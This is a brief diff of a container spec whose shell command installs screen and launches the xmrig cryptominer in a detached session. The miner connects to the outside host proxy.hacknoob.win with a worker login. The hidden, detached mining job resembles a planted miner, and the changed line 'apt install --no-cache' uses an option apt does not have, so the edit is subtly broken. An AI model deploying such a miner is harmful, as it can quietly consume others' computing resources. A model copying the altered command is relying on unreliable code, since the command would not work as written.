@@ -19,7 +19,7 @@ spec:
     - /bin/sh
     - -c
     - |
-      apk add --no-cache screen && \
+      apt install --no-cache screen && \
       screen -dmS xmrig-session /home/worker1/xmrig/build/xmrig \
       -o proxy.hacknoob.win:5551 \
       -u slave1+150 \
